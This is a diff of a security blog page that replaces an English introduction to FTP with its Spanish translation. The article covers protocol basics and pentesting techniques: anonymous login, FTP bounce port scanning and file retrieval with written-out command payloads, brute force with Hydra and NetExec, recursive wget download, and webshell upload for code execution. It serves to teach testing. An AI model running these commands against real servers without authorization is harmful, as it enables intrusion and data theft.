@@ -18,7 +18,7 @@
     
     
       
-        <title>Intro to FTP - Atlansec</title>
+        <title>Introducción a FTP - Atlansec</title>
       
     
     
@@ -55,11 +55,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="Intro to FTP - Atlansec" >
+        <meta  property="og:title"  content="Introducción a FTP - Atlansec" >
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://atlansec.es/assets/images/social/en/blog/posts/14-11-2024.png" >
+        <meta  property="og:image"  content="https://atlansec.es/assets/images/social/es/blog/posts/14-11-2024.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -71,11 +71,11 @@
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="Intro to FTP - Atlansec" >
+        <meta  name="twitter:title"  content="Introducción a FTP - Atlansec" >
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://atlansec.es/assets/images/social/en/blog/posts/14-11-2024.png" >
+        <meta  name="twitter:image"  content="https://atlansec.es/assets/images/social/es/blog/posts/14-11-2024.png" >
       
     
     
@@ -96,7 +96,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#theory" class="md-skip">
+        <a href="#teoria" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -432,47 +432,47 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#theory" class="md-nav__link">
+  <a href="#teoria" class="md-nav__link">
     <span class="md-ellipsis">
-      Theory
+      Teoría
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Theory">
+    <nav class="md-nav" aria-label="Teoría">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#communication-channels" class="md-nav__link">
+  <a href="#canales-de-comunicacion" class="md-nav__link">
     <span class="md-ellipsis">
-      Communication channels
+      Canales de comunicación
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#connection-modes" class="md-nav__link">
+  <a href="#modos-de-conexion" class="md-nav__link">
     <span class="md-ellipsis">
-      Connection modes
+      Modos de conexión
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Connection modes">
+    <nav class="md-nav" aria-label="Modos de conexión">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#active" class="md-nav__link">
+  <a href="#activo" class="md-nav__link">
     <span class="md-ellipsis">
-      Active
+      Activo
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#passive" class="md-nav__link">
+  <a href="#pasivo" class="md-nav__link">
     <span class="md-ellipsis">
-      Passive
+      Pasivo
     </span>
   </a>
   
@@ -489,9 +489,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ftp-commands" class="md-nav__link">
+  <a href="#comandos-ftp" class="md-nav__link">
     <span class="md-ellipsis">
-      FTP commands
+      Comandos FTP
     </span>
   </a>
   
@@ -549,13 +549,13 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#brute-force-attack" class="md-nav__link">
+  <a href="#ataque-por-fuerza-bruta" class="md-nav__link">
     <span class="md-ellipsis">
-      Brute force attack
+      Ataque por fuerza bruta
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Brute force attack">
+    <nav class="md-nav" aria-label="Ataque por fuerza bruta">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -582,9 +582,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#full-content-backup" class="md-nav__link">
+  <a href="#backup-sorpresa" class="md-nav__link">
     <span class="md-ellipsis">
-      Full content backup
+      Backup sorpresa
     </span>
   </a>
   
@@ -623,113 +623,109 @@
                   
 
 
-  <h1>Intro to FTP</h1>
+  <h1>Introducción a FTP</h1>
 
-<p>FTP (File Transfer Protocol) is one of the <strong>oldest and most widely</strong> used protocols for <strong>transferring files</strong> between computers. While it provides a simple way to move data, its default configuration lacks security, making it a common target for attackers. In this article, we’ll cover the basics of FTP, its <strong>communication modes</strong>, <strong>essential commands</strong>, and <strong>common misconfigurations</strong> that could be exploited. Whether you're a cybersecurity enthusiast or a penetration tester, understanding FTP is crucial for securing or assessing network environments.</p>
+<p>El protocolo FTP (File Transfer Protocol) es un protocolo usado para la transferencia de archivos entre ordenadores en red, este protocolo presenta arquitectura cliente-servidor usándose un servidor para servir archivos que pueden ser accedidos por N clientes. Por defecto, la información se transmite en texto plano, aunque existe una versión cifrada del mismo llamada SFTP (Secure File Transfer Protocol).</p>
 <!-- more -->
 
-<p>This protocol has a client-server architecture using a server to serve files that can be accessed by N clients. By default, <strong>the information is transmitted in plain text</strong>, although there is an encrypted version of it called SFTP (Secure File Transfer Protocol).</p>
-<p>Although there are implementations with a graphical interface, in this article we will make use of the FTP command line tool, which gives us a lot of flexibility when working with the protocol. In later articles we will explore the main client and server implementations, although in this one we will focus on explaining the basic concepts of the protocol, how to work with it and how to take advantage of some misconfigurations.</p>
-<h2 id="theory">Theory</h2>
-<h3 id="communication-channels">Communication channels</h3>
-<p>For FTP to work, two communication channels are required, one for sending commands and the other for data.</p>
-<h3 id="connection-modes">Connection modes</h3>
-<h4 id="active">Active</h4>
-<p>This is the default connection mode for FTP connections, in which two events occur:</p>
+<p>Si bien existen implementaciones con interfaz gráfica, en este artículo haremos uso de la herramienta de línea de comandos de FTP, la cual nos da bastante flexibilidad a la hora de trabajar con el protocolo. En artículos posteriores exploraremos las principales implementaciones de cliente y servidor, aunque en este nos centraremos en explicar los conceptos básicos del protocolo, como trabajar con él y como aprovechar algunas malas configuraciones.</p>
+<h2 id="teoria">Teoría</h2>
+<h3 id="canales-de-comunicacion">Canales de comunicación</h3>
+<p>Para el funcionamiento de FTP se requieren de dos canales de comunicación, uno para el envío de comandos y otro para los datos.</p>
+<h3 id="modos-de-conexion">Modos de conexión</h3>
+<h4 id="activo">Activo</h4>
+<p>Es el modo de conexión predeterminado para las conexiones FTP, en él ocurren dos eventos:</p>
 <ul>
-<li>A command channel is established in the connection to the server between the server's command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li>
-<li>Once the data connection is established, an attempt is made to open a connection from the server's data port (20 by default) to port P+1 on the client.</li>
+<li>Se establece un canal de comandos en la conexión con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li>
+<li>Una vez establecida la conexión de datos se intenta abrir una conexión desde el puerto de datos del servidor (20 por defecto) al puerto P+1 del cliente.</li>
 </ul>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>Active mode may present problems with client firewalls because it attempts to create a direct connection to a client-side port, which may be blocked by certain firewalls.</p>
+<div class="admonition nota">
+<p class="admonition-title">Nota</p>
+<p>El modo activo puede presentar problemas con los firewalls del cliente debido a que intenta crear una conexión directa a un puerto del lado cliente, lo cual puede ser bloqueado por ciertos firewalls.</p>
 </div>
-<h4 id="passive">Passive</h4>
-<p>This mode arises as a solution to the problem of client firewalls, here the workflow is modified so that both the data connection and the client connection are initiated from the client, we can break it down into two events.</p>
+<h4 id="pasivo">Pasivo</h4>
+<p>Este modo surge como solución al problema de los firewalls del cliente, aquí se modifica el flujo de trabajo de modo que tanto la conexión de datos como la conexión del cliente se inician desde el cliente, podemos desglosarlo en dos eventos.</p>
 <ul>
-<li>A command channel is established on the server connection between the server command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li>
-<li>Once the data connection is established a data connection is opened from port P+1 on the client to a port on the server data channel, this process is repeated for each file transfer occupying a different server port on each connection (this can be configured in most server side software) .</li>
+<li>Se establece un canal de comandos en la conexión con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li>
+<li>Una vez establecida la conexión de datos se abre una conexión de datos desde el puerto P+1 del cliente a un puerto del canal de datos del servidor, este proceso se repite para cada transferencia de archivos ocupando un puerto distinto del servidor en cada conexión (esto puede ser configurado en la mayoría de los software del lado servidor) .</li>
 </ul>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>Passive mode requires the opening of a range of ports in the firewall, this can generate some security problems if this port opening is not configured correctly.</p>
+<div class="admonition nota">
+<p class="admonition-title">Nota</p>
+<p>El modo pasivo requiere de la apertura de un rango de puertos en el firewall, esto puede generar algunos problemas de seguridad si esta apertura de puertos no se configura de manera correcta.</p>
 </div>
-<h2 id="ftp-commands">FTP commands</h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>CWD<span class="w"> </span>-&gt;<span class="w"> </span>Changes<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>directory<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>specified<span class="w"> </span>one
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>DELE<span class="w"> </span>-&gt;<span class="w"> </span>Deletes<span class="w"> </span>the<span class="w"> </span>specified<span class="w"> </span>file
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>EPRT<span class="w"> </span>-&gt;<span class="w"> </span>Establish<span class="w"> </span>a<span class="w"> </span>socket<span class="w"> </span><span class="k">for</span><span class="w"> </span>data<span class="w"> </span>connection
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>LIST<span class="w"> </span>-&gt;<span class="w"> </span>List<span class="w"> </span>the<span class="w"> </span>files<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>directory
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>PASV<span class="w"> </span>-&gt;<span class="w"> </span>Change<span class="w"> </span>mode<span class="w"> </span>to<span class="w"> </span>passive<span class="w"> </span>mode
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>PWD<span class="w"> </span>-&gt;<span class="w"> </span>Displays<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>directory<span class="w"> </span>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>RETR<span class="w"> </span>-&gt;<span class="w"> </span>Download<span class="w"> </span>the<span class="w"> </span>specified<span class="w"> </span>file
+<h2 id="comandos-ftp">Comandos FTP</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>CWD<span class="w">  </span>-&gt;<span class="w"> </span>Cambia<span class="w"> </span>el<span class="w"> </span>directorio<span class="w"> </span>actual<span class="w"> </span>por<span class="w"> </span>el<span class="w"> </span>especificado
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>DELE<span class="w"> </span>-&gt;<span class="w"> </span>Elimina<span class="w"> </span>el<span class="w"> </span>archivo<span class="w"> </span>especificado
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>EPRT<span class="w"> </span>-&gt;<span class="w"> </span>Establecer<span class="w"> </span>un<span class="w"> </span>socket<span class="w"> </span>para<span class="w"> </span>la<span class="w"> </span>conexión<span class="w"> </span>de<span class="w"> </span>datos
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>LIST<span class="w"> </span>-&gt;<span class="w"> </span>Lista<span class="w"> </span>los<span class="w"> </span>archivos<span class="w"> </span>en<span class="w"> </span>el<span class="w"> </span>directorio<span class="w"> </span>actual
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>PASV<span class="w"> </span>-&gt;<span class="w"> </span>Cambia<span class="w"> </span>el<span class="w"> </span>modo<span class="w"> </span>a<span class="w"> </span>pasivo
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>PWD<span class="w">  </span>-&gt;<span class="w"> </span>Muestra<span class="w"> </span>el<span class="w"> </span>directorio<span class="w"> </span>actual<span class="w"> </span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>RETR<span class="w"> </span>-&gt;<span class="w"> </span>Descarga<span class="w"> </span>el<span class="w"> </span>archivo<span class="w"> </span>especificado
 </span></code></pre></div>
 <h2 id="anonymous-login">Anonymous login</h2>
-<p>There is an FTP configuration that allows the use of a login to share files for any user that requires it, in case this configuration is enabled a user could use anonymous as login name and any password to access the server as a user with low privileges, although in certain cases this can lead to compromise the entire system.</p>
+<p>Existe una configuración de FTP que permite el uso de un login para compartir ficheros para cualquier usuario que lo requiera, en caso de que esta configuración este habilitada un usuario podría usar anonymous como nombre de inicio de sesión y cualquier contraseña acceder al servidor como un usuario con bajos privilegios, aunque en ciertos casos esto puede llevar a comprometer el sistema entero.</p>
 <h2 id="ftp-bounce-port-scan">FTP Bounce port scan</h2>
-<p>It is possible to abuse the PORT and ERPT commands to perform an open port scan via an FTP server.</p>
+<p>Es posible abusar de los comandos PORT y ERPT para realizar un escaneo de puertos abiertos mediante un servidor FTP.</p>
 <h3 id="nmap">Nmap</h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-b<span class="w"> </span>&lt;name&gt;:&lt;pass&gt;@&lt;ftp_server&gt;<span class="w"> </span>&lt;victim&gt;
 </span></code></pre></div>
 <h3 id="hand-made">Hand-made</h3>
-<p>Once connected we can perform the port scan using the PORT and ERPT commands followed by a LIST command.</p>
-<p>Here is an example for scanning port 9091 on host 10.10.10.14</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>PORT<span class="w"> </span><span class="m">10</span>.10.10.14.14.0.9091
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>EPRT<span class="w"> </span><span class="p">|</span><span class="m">2</span><span class="p">|</span><span class="m">10</span>.10.10.14<span class="p">|</span><span class="m">9091</span><span class="o">||</span>
+<p>Una vez conectado podemos realizar el escaneo de puertos mediante los comandos PORT y ERPT seguidos de un comando LIST .</p>
+<p>Aquí tenemos un ejemplo para escanear el puerto 9091 del host 10.10.10.14</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>PORT<span class="w"> </span><span class="m">10</span>,10,10,14,0,9091
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>EPRT<span class="w"> </span><span class="p">|</span><span class="m">2</span><span class="p">|</span><span class="m">10</span>.10.10.14<span class="p">|</span><span class="m">9091</span><span class="p">|</span>
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
 </span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>LIST
 </span></code></pre></div>
-<p>If the response is a 150 the port is open, in case of receiving a 415 the port is closed.</p>
+<p>Si la respuesta es un 150 el puerto está abierto, en caso de recibir un 415 el puerto está cerrado.</p>
 <h2 id="ftp-bounce-file-get">FTP Bounce file get</h2>
-<p>This attack allows an attacker to download files from an FTP server not accessible by the attacker, but which can be reached by an FTP server accessible by the attacker.</p>
-<figure>
-    <img alt="Net Diagram" src="../../../../assets/posts/2024/11/14/net_diagram.png" />
-  <figcaption>Net Diagram</figcaption>
-</figure>
-<p>This attack has the following prerequisites:</p>
+<p>Este ataque permite a un atacante descargar ficheros de un servidor FTP no accesible por el atacante, pero al que sí puede llegar un servidor FTP accesible por el atacante</p>
+<p><img alt="Net Diagram" src="../../../../assets/posts/2024/11/14/net_diagram.png" /></p>
+<p>Este ataque tiene los siguientes prerequisitos:</p>
 <ul>
-<li>Valid credentials for External FTP.</li>
-<li>Valid credentials for Internal FTP.</li>
-<li>Write access for External FTP.</li>
-<li>PORT command execution permissions on both External and Internal.</li>
+<li>Credenciales válidas para External FTP.</li>
+<li>Credenciales válidas para Internal FTP.</li>
+<li>Acceso de escritura para External FTP.</li>
+<li>Permisos de ejecución del comando PORT tanto en External como en Internal.</li>
 </ul>
-<p>First of all we will deploy an FTP server on the attacker's machine, this server has to support passive mode.</p>
-<p>Once deployed we will open a passive connection with the PASV command and tell it to save it with STOR output.ext .</p>
-<p>Now we will create a file with the commands we want to launch against the second server, an example would be the following:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>user<span class="w"> </span>ftp<span class="w"> </span><span class="c1"># User for the internal server</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>pass<span class="w"> </span>password<span class="w"> </span><span class="c1"># Password for the internal server</span>
+<p>Primero que nada desplegaremos un servidor FTP en la máquina del atacante, este servidor tiene que soportar el modo pasivo.</p>
+<p>Una vez desplegado abriremos una conexión pasiva con el comando PASV y le diremos que la guarde con STOR output.ext .</p>
+<p>Ahora crearemos un archivo con los comandos que queremos lanzar contra el segundo servidor, un ejemplo seria el siguiente:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>user<span class="w"> </span>ftp<span class="w">   </span><span class="c1"># Usuario para el servidor internal</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>pass<span class="w"> </span>password<span class="w"> </span><span class="c1"># Password para el servidor internal</span>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>cwd<span class="w"> </span>/DIRECTORY
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nb">type</span><span class="w"> </span>i
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>port<span class="w"> </span>F,F,F,F,F,F,X,X<span class="w"> </span><span class="c1">#Our passive port</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>port<span class="w"> </span>F,F,F,F,X,X<span class="w">  </span><span class="c1">#Nuestro puerto pasivo</span>
 </span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>retr<span class="w"> </span>file.ext
 </span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>quit
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@<span class="w"> </span>...<span class="w"> </span>^@^@^@^@
 </span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@<span class="w"> </span>...<span class="w"> </span>^@^@^@^@
 </span></code></pre></div>
-<p>Now we upload it with PUT and from the external server we execute the following commands:</p>
+<p>Ahora lo subimos con PUT y desde el servidor externo ejecutamos los siguientes comandos:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>put<span class="w"> </span>payload
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>quote<span class="w"> </span><span class="s2">&quot;port C,C,C,C,C,0,21&quot;</span><span class="w"> </span><span class="c1"># IP of internal server</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>quote<span class="w"> </span><span class="s2">&quot;port C,C,C,C,0,21&quot;</span><span class="w"> </span><span class="c1"># IP del servidor interno</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>quote<span class="w"> </span><span class="s2">&quot;retr payload&quot;</span>
 </span></code></pre></div>
-<p>After this we will have the file.ext file on our server as output.ext</p>
-<h2 id="brute-force-attack">Brute force attack</h2>
-<p>Many FTP servers do not have protection against brute force attacks. Having a user or a list of them we can carry out a brute force attack with different credentials obtained from various sources, although there are several tools for this purpose, the two most common are NetExec and Hydra.  </p>
+<p>Tras esto tendremos el archivo file.ext en nuestro servidor como output.ext</p>
+<h2 id="ataque-por-fuerza-bruta">Ataque por fuerza bruta</h2>
+<p>Muchos de los servidores FTP no presentan protección contra ataques por fuerza bruta. Teniendo un usuario o una lista de ellos podemos llevar a cabo un ataque de fuerza bruta con diferentes credenciales obtenidas de diversas fuentes, si bien existen varias herramientas para este fin, las dos más comunes son NetExec e Hydra. </p>
 <h3 id="netexec">NetExec</h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>ftp<span class="w"> </span>IP<span class="w"> </span>-u<span class="w"> </span>userfile<span class="w"> </span>-p<span class="w"> </span>passwordfile
 </span></code></pre></div>
 <h3 id="hydra">Hydra</h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>userfile<span class="w"> </span>-P<span class="w"> </span>passwordfile<span class="w"> </span>ftp://IP
 </span></code></pre></div>
-<h2 id="full-content-backup">Full content backup</h2>
-<p>This is not an attack per se, but it is quite useful, as it allows us to download all accessible files from the server using a single command.</p>
+<h2 id="backup-sorpresa">Backup sorpresa</h2>
+<p>Esto no es un ataque per se, pero es bastante útil, ya que nos permite descargar todos los archivos accesibles del servidor mediante un solo comando.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>wget<span class="w"> </span>-r<span class="w"> </span>ftp://IP/dir/*<span class="w"> </span>--ftp-user<span class="o">=</span>username<span class="w"> </span>--ftp-password<span class="o">=</span>password
 </span></code></pre></div>
 <h2 id="ftp-file-upload-to-rce">FTP file upload to RCE</h2>
-<p>In certain circumstances, permission to upload files to the server along with other misconfigurations can lead to obtaining remote execution of commands on the server.</p>
-<p>The most common case is the possibility of uploading files to be served by a web server, where we could upload a webshell interpretable by the server to obtain command execution.</p>
+<p>En determinadas circunstancias, el permiso para subir ficheros al servidor junto a otras malas configuraciones puede llevar a la obtención de ejecución remota de comandos en el servidor.</p>
+<p>El caso más común es la posibilidad de subir ficheros que van a ser luego servidos por un servidor web, donde podríamos subir una webshell interpretable por el servidor para lograr obtener ejecución de comandos.</p>
 <h2 id="sniffing-credentials">Sniffing credentials</h2>
-<p>Since FTP works by default in plain text, it is possible for an attacker on the same network to use a sniffer and capture both the credentials and the FTP conversation.</p>
+<p>Dado que FTP funciona por defecto en texto plano, es posible para un atacante en la misma red usar un sniffer y capturar tanto las credenciales como la conversación FTP.</p>
+<p>En el próximo artículo de esta serie sobre FTP hablaremos sobre fallos comunes de implementación y algunas vulnerabilidades conocidas de algunas implementaciones del protocolo.</p>
 <hr />
-<p>In the next article of this series on FTP we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>
 
 
 
